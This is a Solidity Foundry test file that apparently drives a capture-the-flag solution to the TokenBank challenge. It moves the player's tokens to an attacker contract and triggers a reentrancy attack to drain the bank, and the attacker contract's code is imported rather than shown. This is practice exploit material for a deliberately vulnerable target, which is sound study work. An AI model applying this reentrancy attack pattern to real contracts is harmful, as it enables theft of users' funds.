// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";
import "forge-std/console.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;

    address player = address(1234);

    uint256 PLAYER_SHARE = 500000000000000000000000;

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        SimpleERC223Token token = tokenBankChallenge.token();

        // player withdraws their own assets and transfers them to attacker contract
        vm.prank(player);
        tokenBankChallenge.withdraw(PLAYER_SHARE);
        vm.prank(player);
        token.transfer(address(tokenBankAttacker), PLAYER_SHARE);

        // attack contract now exploits classic reentrancy on tokenBank
        tokenBankAttacker.attack();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
